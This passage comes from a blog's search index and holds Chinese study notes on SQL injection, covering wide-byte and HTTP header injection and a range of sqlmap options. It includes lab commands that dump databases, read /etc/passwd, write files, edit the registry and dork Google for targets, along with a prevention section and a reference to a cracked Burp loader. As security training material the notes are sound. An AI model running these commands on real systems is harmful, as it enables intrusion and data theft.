–确定是77，M依次类推（简便的方式使用union查看单个ascii快速确定字符串http://192.168.75.133/less-1.asp?id=1&#39; union select &#39;1&#39;,&#39;2&#39;,ascii(substring(@@version,1,1))  --）</code></pre><p><img src="/Mssql%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/20190907030754284.png" alt><br>最终确定version字符</p><pre><code>    Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (X64) Apr 2 2010 15:48:46 Copyright (c) Microsoft Corporation Enterprise Edition (64-bit) on Windows NT 6.1 (Build 7601: Service Pack 1) (Hypervisor)</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> i春秋 </category>
+          
+          <category> SQL注入 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 第八周 </tag>
+            
+            <tag> SQL注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQL宽字节注入，使用sqlmap注入</title>
+      <link href="/2019/09/07/SQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
+      <url>/2019/09/07/SQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="常见的三种编码方式"><a href="#常见的三种编码方式" class="headerlink" title="常见的三种编码方式"></a>常见的三种编码方式</h2><pre><code>UTF8  三个16进制组成一个汉字GBK   两个16进制组成一个汉字ASCII 一个16进制组成一个字符</code></pre><h2 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h2><p>和SQL注入原理类似，破坏原SQL语句，使用注释符修复或使用内联的方式，修改SQL语句，令原SQL语句执行修改后的SQL语句。</p><h2 id="根据URL编码和以上三种编码方式结合的注入"><a href="#根据URL编码和以上三种编码方式结合的注入" class="headerlink" title="根据URL编码和以上三种编码方式结合的注入"></a>根据URL编码和以上三种编码方式结合的注入</h2><pre><code>&#39;       %27&quot;       %22#       %23\       %5c  %       %25说明：为了 \ 在编码中有意义，在GBK编码中可以与 %df 或 %81 或 %ec 结合。但在UTF8中不幸没有</code></pre><p><strong>思路：</strong>通过对特殊字符进行编码方式绕过网站对SQL注入的防护。</p><h3 id="网站常用的URL进行处理的方式"><a href="#网站常用的URL进行处理的方式" class="headerlink" title="网站常用的URL进行处理的方式"></a>网站常用的URL进行处理的方式</h3><pre><code>    addslashes() 对URL输入的特殊字符处理，但存在宽字节注入漏洞    PDO连接数据库，在PHP5.3之前同样存在宽字节SQL注入漏洞    MySQL连接数据库，两种方式设置数据库编码：        1。使用 mysql_query(&#39;set names &quot;GBK&quot;&#39;);需要和mysql_real_escape_string()配合使用，才可以预防宽字节注入。        2。使用 mysql_query(&#39;set names &quot;GBK&quot;&#39;);和 mysql_real_escape_string()配合是不能预防宽字节注入的。    注意：php默认会对URL的参数进行一次转码。网站通常习惯使用 urldecode() 函数 将参数一次性转码转成原始数据。   </code></pre><p><strong>urldecode()和 rawurldecode() 区别在于 rawurldecode() 会将 + 进行转码</strong></p><h1 id="http头注入"><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h1><pre><code>    User-Agent：浏览器像服务器表明身份信息，识别客户端的操作环境信息    Cookie：辨别用过户的身份标识    X-Forwarded-For：建成XFF头，HTTP客户端的真实IP（关于注入：有些网站在记录访问者IP地址时，如果写入数据库，就可能存在注入漏洞）    Referer：浏览器向WEB服务器表明自己的来源连接    Host：客户端指定自己想访问的WEB服务器的域名/IP 地址和端口</code></pre><h1 id="关于使用sqlmap的技巧"><a href="#关于使用sqlmap的技巧" class="headerlink" title="关于使用sqlmap的技巧"></a>关于使用sqlmap的技巧</h1><p>如果找到注入漏洞，在常规不能使用sqlmap进行注入的情况下，则通过抓包，在此漏洞的基础上创建该漏洞类型的SQL语句，嵌入到该漏洞中，连接sqlmap，用*指定注入点。可以多线程（–thread 上限是10个） 使用–technique “BEUSTQ”可以只进行该类型的注入，加快速度。</p><pre><code>    BEUSTQ的含义：        B：Boolean-based blind  布尔类型注入        E：Error-based  报错型注入        U：Union query-based  可联合查询注入        S：Stacked queries  多语句查询注入/堆叠注入        T：Time-based blind  基于时间的延迟注入        Q：Inline Queries  嵌套内联查询注入</code></pre><h1 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h1><h2 id="宽字节注入-1"><a href="#宽字节注入-1" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>根据提供centos7的虚拟机，测试老司机开车网站的宽字节注入漏洞，同时可以通过sqlmap跑出数据</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>1。抓包<br><img src="/SQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/20190907023614621.png" alt><br><img src="/SQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/20190907023624340.png" alt><br>2。确定是 ‘ 款字符注入，编写payload 导入sqlmap 去掉文档中不必要的 *<br><img src="/SQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/20190907023645743.png" alt><br>3。使用sqlmap跑数据库信息</p><pre><code>sqlmap -r &quot;D：\1.txt&quot;  --dbs --thread 10执行（线程上限是：10）</code></pre><p><img src="/SQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/20190907023744166.png" alt><br>4。指定漏洞爆破数据库<br><img src="/SQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/20190907023820318.png" alt><br>5。–dump数据</p><pre><code>sqlmap -r &quot;D：\1.txt&quot;   --thread 10 --technique B  -D test –dump</code></pre><p><img src="/SQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/20190907023851717.png" alt></p><h2 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h2><h3 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h3><p>根据提供centos7-留言板的虚拟机，测试留言板系统登陆页面的请求头ip注入，同时可以通过sqlmap跑出数据。</p><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h3><p>1。根据提供centos7-留言板的虚拟机，测试留言板系统登陆页面的请求头ip注入，同时可以通过sqlmap跑出数据。<br><img src="/SQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/20190907024120527.png" alt><br>2。使用sqlmap进行爆破</p><pre><code>Sqlmap确定漏洞sqlmap -r &quot;C:\Users\ROC\Desktop\1.txt&quot; --thread 10</code></pre><p><img src="/SQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/20190907024159131.png" alt></p><pre><code>sqlmap -r &quot;C:\Users\ROC\Desktop\1.txt&quot; --thread 10 --dbs</code></pre><p><img src="/SQL%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/20190907024217358.png" alt></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> i春秋 </category>
+          
+          <category> SQL注入 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 第八周 </tag>
+            
+            <tag> SQL注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>sqlmap的操作</title>
+      <link href="/2019/09/01/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/"/>
+      <url>/2019/09/01/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/</url>
+      
+        <content type="html"><![CDATA[<h1 id="sqlmap使用的注意点"><a href="#sqlmap使用的注意点" class="headerlink" title="sqlmap使用的注意点"></a>sqlmap使用的注意点</h1><p>如果第一次失败后，记得删除用户缓存。因为sqlmap在注入时会自动读取用户缓存，如果不删除可能会影响结果</p><h1 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h1><pre><code>常用参数–current-user 操作系统用户–current-db     当前库名–dbs            所有库名–hostname    –users        数据库管理员–privileges   查看管理员权限–roles        查看数据库角色脱裤参数1.    –dump，-C，-T，-D，--start，--stop（部分脱裤）2.    –dump-all –exclude-sysdbs（直接脱裤）3.    –sql-query “select * from users” （自己的命令脱裤）4.    当数据库管理员比较安全，没法顺利脱裤，只能利用字典拆解表名列名    a)    –common-tables    --common-columns系统操作参数Sqlmap的系统操作a)    参数：    i.    –udf-inject    --shared-lib        编译共享库并上传实现UDF高级注入        1.    Linux：share object文件    windows：DLL文件    ii.    读文件：        1.    –file-read=”绝对路径”    iii.    写文件：        1.    –file-write=”需要写入的文件绝对路径”  --file-dest=”写入的路径”    iv.    Linux下        1.    –sql-shell        mysql的shell（本质上是对注入查询出来的数据建立的临时数据库，只能对原数据查询，不能增删该）        2.    –os-shell        Linux的上传得webshell连接后的一个可控shell，但不是系统shell        3.    –os-cmd    v.    Windows下        1.    –reg-read    （读注册表）        2.    –reg-add        （写注册表）        3.    –reg-del        （删注册表）        4.    –reg-key –reg-value –reg-data  --reg-type（注册表参数）</code></pre><h1 id="GET请求的方式（POST的方式类似，可以使用mehod该发包方式，data设置参数）"><a href="#GET请求的方式（POST的方式类似，可以使用mehod该发包方式，data设置参数）" class="headerlink" title="GET请求的方式（POST的方式类似，可以使用mehod该发包方式，data设置参数）"></a>GET请求的方式（POST的方式类似，可以使用mehod该发包方式，data设置参数）</h1><h2 id="注入查询"><a href="#注入查询" class="headerlink" title="注入查询"></a>注入查询</h2><pre><code>a)    –u 指定网页 –p 指定参数（注入位置）sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id根据英文提示进行选择即可注入测试后出现的结果</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901071724246.png" alt></p><pre><code>sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id --current-user 查看当前用户</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901071902948.png" alt></p><pre><code>sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id --current-db</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901071914102.png" alt></p><pre><code>sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id –dbs</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901071925996.png" alt></p><pre><code>sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id --hostname</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901071938999.png" alt></p><pre><code>sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id –users</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901071958609.png" alt></p><pre><code>sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id --privileges</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072010888.png" alt></p><pre><code>sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id –role</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072024847.png" alt></p><h2 id="脱裤"><a href="#脱裤" class="headerlink" title="脱裤"></a>脱裤</h2><p><strong>步骤：查库-〉查表-〉查数据</strong></p><pre><code>sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id –dbs 查库，选择库名sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id -D security –tables 查表</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072215644.png" alt></p><pre><code>sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id -D security -T users –dump 查数据</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072235740.png" alt></p><pre><code>通过查询表格结构，选择性查询数据sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id -D security -T users –columns 查表格结构</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072253138.png" alt></p><pre><code>查单列数据sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id -D security -T users -C username –dump</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072306019.png" alt></p><pre><code>查多列数据sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id -D security -T users -C username,password –dump</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072323069.png" alt><br><strong>直接脱裤</strong></p><pre><code>直接脱裤sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id --dump-all --exclude-sysdbs</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072347374.png" alt></p><pre><code>自己命令脱裤sqlmap -u http://192.168.1.106/sqli-labs-master/Less-1/?id=1 -p id --sql-query &quot;select * from users&quot;</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072359515.png" alt></p><h3 id="对于带有cookie的脱裤操作（如果直接读取数据包，包中包含cookie的数据则可以直接脱裤）"><a href="#对于带有cookie的脱裤操作（如果直接读取数据包，包中包含cookie的数据则可以直接脱裤）" class="headerlink" title="对于带有cookie的脱裤操作（如果直接读取数据包，包中包含cookie的数据则可以直接脱裤）"></a>对于带有cookie的脱裤操作（如果直接读取数据包，包中包含cookie的数据则可以直接脱裤）</h3><h4 id="手动添加cookie"><a href="#手动添加cookie" class="headerlink" title="手动添加cookie"></a>手动添加cookie</h4><pre><code>i.    以DVWA为目标ii.    开始操作：    最好在 –u 后的url地址中添加 “” sqlmap -u &quot;http://192.168.1.106/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit&amp;user_token=cba280d6f9c6dc25364ee79146d10431#&quot; -p id</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072518260.png" alt><br>没有cookie所以导致失败<br>通过对地址添加cookie修正问题，或者直接BurpSuite抓包对文件进行读取发包方式<br><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072535503.png" alt></p><pre><code>获取cookie，添加到命令中sqlmap -u &quot;http://192.168.1.106/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; -p id --cookie &quot;security=low; PHPSESSID=a68oeapobi0kid19n3fi3t02g3&quot;</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072548270.png" alt><br>可以脱裤操作</p><h4 id="抓包添加cookie"><a href="#抓包添加cookie" class="headerlink" title="抓包添加cookie"></a>抓包添加cookie</h4><p>使用BurpSuite抓包脱裤<br>1．    抓包将数据包保存到本地<br><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072655540.png" alt><br>2．    使用 –r 绝对路径进行操作        这种适合POST数据包和含有cookie的数据包<br>sqlmap -r “C:\Users\ROC\Desktop\a.txt” -p id<br><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072705574.png" alt><br>3．    脱裤操作一样<br>4．    注入时修改user-gent<br>sqlmap -r “C:\Users\ROC\Desktop\a.txt” -p id –user-agent “nihao”    –user-agent 内容可以自定义<br><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072715198.png" alt><br>5．    –data 通过发送设置数据    –method指定 post还是get方式发送数据<br>a)    使用POST的方式<br>sqlmap -r “C:\Users\ROC\Desktop\1.txt” -p search –method post –data “search=1234”<br><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072724410.png" alt><br>b)    使用GET的方式<br>sqlmap -r “C:\Users\ROC\Desktop\1.txt” -p search –method get –data “search=1234”<br><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901072732666.png" alt></p><h2 id="系统操作"><a href="#系统操作" class="headerlink" title="系统操作"></a>系统操作</h2><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><pre><code>sqlmap -u &quot;http://192.168.1.106/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; -p id --cookie &quot;security=low; PHPSESSID=a68oeapobi0kid19n3fi3t02g3&quot; --file-read=&quot;/etc/passwd&quot;</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901073025801.png" alt></p><h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><pre><code>sqlmap -r &quot;D:\a.txt&quot; --file-write=&quot;D:\1.txt&quot; --file-dest=&quot;/var/www/html/tmp/1,txt&quot;</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901073050131.png" alt><br>权限不足<br>换个文件路径</p><pre><code>sqlmap -u &quot;http://192.168.100.88/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; -p id --cookie &quot;security=low; PHPSESSID=fqc3ra2jpq8538vaa6idlbp2a5&quot; --file-write=&quot;D：\1.txt&quot; --file-dest=&quot;/tmp/1&quot;</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190902083025960.png" alt><br>写入成功<br>查看写入的内容</p><pre><code>sqlmap -u &quot;http://192.168.100.88/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; -p id --cookie &quot;security=low; PHPSESSID=fqc3ra2jpq8538vaa6idlbp2a5&quot; --file-read=&quot;/tmp/1.txt&quot;</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190902083145229.png" alt></p><h3 id="系统操作（以添加注册表为例）"><a href="#系统操作（以添加注册表为例）" class="headerlink" title="系统操作（以添加注册表为例）"></a>系统操作（以添加注册表为例）</h3><pre><code>sqlmap -r &quot;C:\Users\ROC\Desktop\1.txt&quot; -p search --reg-add --reg-key=&quot;HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1</code></pre><p><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901073136105.png" alt></p><h3 id="执行SQL语句（本质是在注入中创建了数据库副本，只能执行查询操作，增删该没有意义）"><a href="#执行SQL语句（本质是在注入中创建了数据库副本，只能执行查询操作，增删该没有意义）" class="headerlink" title="执行SQL语句（本质是在注入中创建了数据库副本，只能执行查询操作，增删该没有意义）"></a>执行SQL语句（本质是在注入中创建了数据库副本，只能执行查询操作，增删该没有意义）</h3><h4 id="对抓取的数据包进行操作"><a href="#对抓取的数据包进行操作" class="headerlink" title="对抓取的数据包进行操作"></a>对抓取的数据包进行操作</h4><p>a)    进入sql-shell<br>sqlmap -r “C:\Users\ROC\Desktop\1.txt” -p search –sql-shell<br><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901073317051.png" alt><br>只能执行查询语句，这个相当于数据库的副本，增删该都没有意义<br>Select * from users<br><img src="/sqlmap%E7%9A%84%E6%93%8D%E4%BD%9C/20190901073328145.png" alt><br>b)    Sqlmap支持 –g 参数使用谷哥浏览器查询，只获取前100个结果<br>    i.    intex:<br>    ii.    inurl:<br>    iii.    intitle:<br>  eg：  sqlmap -g “inurl:&quot;.php?id=1&quot;“  就可以在google中搜索符合条件的前一百进行注入测试。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> i春秋 </category>
+          
+          <category> SQL注入 </category>
+          
+          <category> 工具 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 工具 </tag>
+            
+            <tag> 第七周 </tag>
+            
+            <tag> SQL注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>windows和Linux设置快捷方式</title>
+      <link href="/2019/09/01/windows%E5%92%8CLinux%E8%AE%BE%E7%BD%AE%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F/"/>
+      <url>/2019/09/01/windows%E5%92%8CLinux%E8%AE%BE%E7%BD%AE%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F/</url>
+      
+        <content type="html"><![CDATA[<h1 id="批处理里的-echo-off、echo-off、-echo-off"><a href="#批处理里的-echo-off、echo-off、-echo-off" class="headerlink" title="批处理里的 @echo off、echo off、::echo off"></a>批处理里的 @echo off、echo off、::echo off</h1><p>1．@echo off</p><pre><code>@echo offecho 1111111111111111111echo 2222222222222222222echo 3333333333333333333echo endpause</code></pre><p><img src="/windows%E5%92%8CLinux%E8%AE%BE%E7%BD%AE%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F/20190901070543586.png" alt></p><pre><code>echo offecho 1111111111111111111echo 2222222222222222222echo 3333333333333333333echo endpause</code></pre><p><img src="/windows%E5%92%8CLinux%E8%AE%BE%E7%BD%AE%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F/20190901070605201.png" alt></p><pre><code>::echo offecho 1111111111111111111echo 2222222222222222222echo 3333333333333333333echo endpause</code></pre><p><img src="/windows%E5%92%8CLinux%E8%AE%BE%E7%BD%AE%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F/20190901070624510.png" alt></p><h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><p>@echo off 执行后，后面的语句均不显示<br>echo off  执行后，后面所有指令均不显示，但本条显示<br>::echo off批处理的注释</p><h1 id="批处理注意的点"><a href="#批处理注意的点" class="headerlink" title="批处理注意的点"></a>批处理注意的点</h1><p>$* 用来接收参数<br>doskey 用来设置参数</p><h2 id="历程"><a href="#历程" class="headerlink" title="历程"></a>历程</h2><p>设置burp的快捷启动方式</p><pre><code>doskey sqlmap=C:\Python27\python.exe E:\WebTool\PyScript\sqlmap\sqlmap.py $*burp使用启动器上的命令，加上绝对路径即可</code></pre><p><img src="/windows%E5%92%8CLinux%E8%AE%BE%E7%BD%AE%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F/20190901070945538.png" alt></p><pre><code>doskey burp=java -Xbootclasspath/p:E:\WebTool\burp\burp-loader-keygen.jar -jar E:\WebTool\burp\burpsuite_pro_v2.0beta.jar</code></pre><p>设置sqlmap执行快捷键</p><pre><code>doskey sqlmap=C:\Python27\python.exe E:\WebTool\PyScript\sqlmap\sqlmap.py $*</code></pre><h1 id="写入到注册表"><a href="#写入到注册表" class="headerlink" title="写入到注册表"></a>写入到注册表</h1><p><strong>如果不写入到注册表，只能在执行该批处理后的当前命令行中执行操作</strong><br>添加到注册表 regedit<br>相关文件下没有的话新建一项，名字无所谓<br><img src="/windows%E5%92%8CLinux%E8%AE%BE%E7%BD%AE%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F/20190901071321262.png" alt></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> i春秋 </category>
+          
+          <category> 工具 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 工具 </tag>
+            
+            <tag> 第七周 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQL注入 预防</title>
+      <link href="/2019/09/01/SQL%E6%B3%A8%E5%85%A5-%E9%A2%84%E9%98%B2/"/>
+      <url>/2019/09/01/SQL%E6%B3%A8%E5%85%A5-%E9%A2%84%E9%98%B2/</url>
+      
+        <content type="html"><![CDATA[<h1 id="防注入的方式"><a href="#防注入的方式" class="headerlink" title="防注入的方式"></a>防注入的方式</h1><h2 id="针对数字型注入"><a href="#针对数字型注入" class="headerlink" title="针对数字型注入"></a>针对数字型注入</h2><p>可以简单的选择类型强制转换<br>intval()函数，会强制对参数处理。<br><strong>注意：对于字符型的注入则没有意义</strong></p><h2 id="针对字符型注入"><a href="#针对字符型注入" class="headerlink" title="针对字符型注入"></a>针对字符型注入</h2><h3 id="使用函数"><a href="#使用函数" class="headerlink" title="使用函数"></a>使用函数</h3><p>1。addslashes() 把单引号转移<br>2。mysql_real_escape_string() mysql自带的安全函数。</p><h2 id="使用PDO连接数据库"><a href="#使用PDO连接数据库" class="headerlink" title="使用PDO连接数据库"></a>使用PDO连接数据库</h2><p><strong>对字符型和数字型都有效：特指绑定参数的方式</strong><br><strong>使用PDO需要注意连接数据库的两种方式，如果是拼接方式，则不但不能预防SQL注入，而且会引入新的漏洞，多语句注入问题。</strong></p><h3 id="事例（PDO绑定参数）"><a href="#事例（PDO绑定参数）" class="headerlink" title="事例（PDO绑定参数）"></a>事例（PDO绑定参数）</h3><pre><code>// 使用PDO连接数据库$pdo = new PDO(&#39;mysql:host=127.0.0.1;dbname=item&#39;, &#39;root&#39;,&#39;root&#39;);$sql=&quot;select * from item.users where uname = :uname and passwd = :passwd&quot;;$result=$pdo-&gt;prepare($sql);//$result-&gt;bindParam(&#39;:uname&#39;,$uname,PDO::PARAM_STR, 12);//$result-&gt;bindParam(&#39;:passwd&#39;,$upass,PDO::PARAM_STR, 12);$result-&gt;execute( array( &#39;:uname&#39; =&gt; $uname,&#39;:passwd&#39;=&gt; $upass));//$result-&gt;execute();$res=$result-&gt;fetchAll(PDO::FETCH_ASSOC); // 取出来的数组是二维数组                                          // fetch()是获取结果的下一行，是一维数组print_r($res);</code></pre><h1 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h1><p>在代码编写时，如果已经对接受的参数进行转义，就不要对其进行二次操作，直到传入数据库。这样可以有效防止人为二次操作造成的SQL注入漏洞。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> i春秋 </category>
+          
+          <category> SQL注入 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 第七周 </tag>
+            
+            <tag> SQL注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQL注入 原理及分类</title>
+      <link href="/2019/09/01/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/"/>
+      <url>/2019/09/01/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/</url>
+      
+        <content type="html"><![CDATA[<h1 id="大致流程"><a href="#大致流程" class="headerlink" title="大致流程"></a>大致流程</h1><p>1。确定注入类型<br>2。确定注入的数据库，数据库版本号<br>3。根据数据库和数据库版本，进行查库<br>4。查表<br>5。查列<br>6。查数据</p><h2 id="Mysql-数据库查询流程"><a href="#Mysql-数据库查询流程" class="headerlink" title="Mysql 数据库查询流程"></a>Mysql 数据库查询流程</h2><h3 id="查库"><a href="#查库" class="headerlink" title="查库"></a>查库</h3><pre><code>select schema_name from information_schema.schemata</code></pre><h3 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h3><pre><code>select table_name from information_schema.tables where table_schema=&#39;库名&#39;</code></pre><h3 id="查列"><a href="#查列" class="headerlink" title="查列"></a>查列</h3><pre><code>select column_name from information_schema.columns where table_name=&#39;表名&#39;</code></pre><h3 id="查内容"><a href="#查内容" class="headerlink" title="查内容"></a>查内容</h3><pre><code>select * from 库名.表名或select 列名 from 库名.表名    等方式都可</code></pre><h2 id="Mssql-数据库查询大致流程"><a href="#Mssql-数据库查询大致流程" class="headerlink" title="Mssql 数据库查询大致流程"></a>Mssql 数据库查询大致流程</h2><h3 id="查库-1"><a href="#查库-1" class="headerlink" title="查库"></a>查库</h3><pre><code>select db_name(n)        n=0 当前库名，n〉0依次遍历库或者select name from master..sysdatabases   查集合</code></pre><h3 id="查表-1"><a href="#查表-1" class="headerlink" title="查表"></a>查表</h3><pre><code>select name from master..sysobjects where xtype=&#39;u&#39;       其中&#39;u&#39;使用用户表 &#39;v&#39;视图  &#39;x&#39;扩展存储过程或者select table_name from information_schema.tables </code></pre><h3 id="查列名"><a href="#查列名" class="headerlink" title="查列名"></a>查列名</h3><pre><code>select column_name from information_schema.columns where table_name=&#39;表名&#39;</code></pre><h3 id="查内容-1"><a href="#查内容-1" class="headerlink" title="查内容"></a>查内容</h3><pre><code>select * from &#39;表名&#39;或者select &#39;列名&#39; from &#39;表名&#39;</code></pre><h2 id="Mssql-实现limit的三种方式"><a href="#Mssql-实现limit的三种方式" class="headerlink" title="Mssql 实现limit的三种方式"></a>Mssql 实现limit的三种方式</h2><pre><code>1.select top 1 查询内容A from 查询来源 where 查询内容A not in (select top 1 查询内容A from 查询来源 order by 1一般id固定为第一列，如果不是需要猜 desc降序) as b括号内查询内容的别名 asc升序2。select top 1 查询内容A from 查询来源 where 查询内容A not in (select top 1序号从0开始，查询内容A from 查询来源)3。select top 1 查询内容A from 查询来源 where 查询内容A not in (&#39;查询结果依次填入，直到查询为空&#39;)</code></pre><h2 id="xml-path-‘路径’-的方式，一次性读取多个字段，保存到xml文档中"><a href="#xml-path-‘路径’-的方式，一次性读取多个字段，保存到xml文档中" class="headerlink" title="xml path(‘路径’)的方式，一次性读取多个字段，保存到xml文档中"></a>xml path(‘路径’)的方式，一次性读取多个字段，保存到xml文档中</h2><pre><code>    select table_name from information_schema.tables for xml path(‘’);</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190907033224249.png" alt><br>这是遍历table_name的结果写入到了xml文档中<br><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190907033304307.png" alt><br>或者这样写，将输出结果进行分割</p><pre><code>    select char(127)+table_name from 